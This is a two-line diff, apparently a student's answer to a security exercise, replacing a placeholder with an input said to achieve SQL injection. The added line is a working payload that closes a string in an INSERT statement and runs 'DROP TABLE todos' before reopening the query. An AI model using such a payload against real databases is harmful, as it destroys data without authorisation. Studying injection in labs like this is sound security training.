@@ -1,2 +1,2 @@
 With the following input I managed to commit SQL injection:
-<put your 'solution' here>
+' , 'asd', 'asd');BEGIN; DROP TABLE todos; COMMIT; INSERT INTO todos (title, id, status) VALUES ('
